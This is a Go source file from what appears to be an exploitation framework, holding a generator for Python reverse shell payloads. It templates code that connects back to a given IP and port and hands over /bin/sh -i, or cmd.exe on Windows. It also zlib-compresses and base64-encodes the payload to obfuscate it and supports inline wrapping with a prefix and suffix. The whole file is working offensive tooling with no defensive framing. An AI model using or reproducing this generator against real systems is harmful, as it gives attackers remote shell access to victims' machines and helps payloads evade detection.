package shellcode

import (
	"bytes"
	"compress/zlib"
	"encoding/base64"
	"fmt"
	"strings"
)

type PyShellCode struct {
	*ShellCodeBase
}

func NewPyShellCode(osTarget, osTargetArch, connectBackIP string, connectBackPort int, badChars []byte, prefix, suffix string) *PyShellCode {
	base := NewShellCodeBase(osTarget, osTargetArch, connectBackIP, connectBackPort, badChars, prefix, suffix)
	return &PyShellCode{base}
}

func (p *PyShellCode) GetPyShellCode() (string, error) {
	if err := p.Validate(); err != nil {
		return "", err
	}

	pythonCode := `
    import socket,subprocess,os
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("{{LOCALHOST}}",{{LOCALPORT}}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])
    `

	if strings.Contains(strings.ToLower(p.Target), "windows") {
		pythonCode = `
        import socket,subprocess,os
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("{{LOCALHOST}}",{{LOCALPORT}}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        p=subprocess.call(["cmd.exe"])
        `
	}

	shellcode, err := p.GenShellCode(strings.TrimSpace(pythonCode))
	if err != nil {
		return "", fmt.Errorf("generate python shellcode failed: %v", err)
	}

	return shellcode, nil
}

func (p *PyShellCode) GetEncodedPyShellCode() (string, error) {
	shellcode, err := p.GetPyShellCode()
	if err != nil {
		return "", err
	}

	var compressed bytes.Buffer
	w := zlib.NewWriter(&compressed)
	if _, err := w.Write([]byte(shellcode)); err != nil {
		return "", fmt.Errorf("compress shellcode failed: %v", err)
	}
	w.Close()

	encoded := base64.StdEncoding.EncodeToString(compressed.Bytes())
	return encoded, nil
}

func (p *PyShellCode) GetShellCode(inline bool) string {
	shellcode, err := p.GetPyShellCode()
	if err != nil {
		return ""
	}

	if inline {
		shellcode = p.MakeInline(shellcode)
	}

	return fmt.Sprintf("%s%s%s", p.Prefix, shellcode, p.Suffix)
}
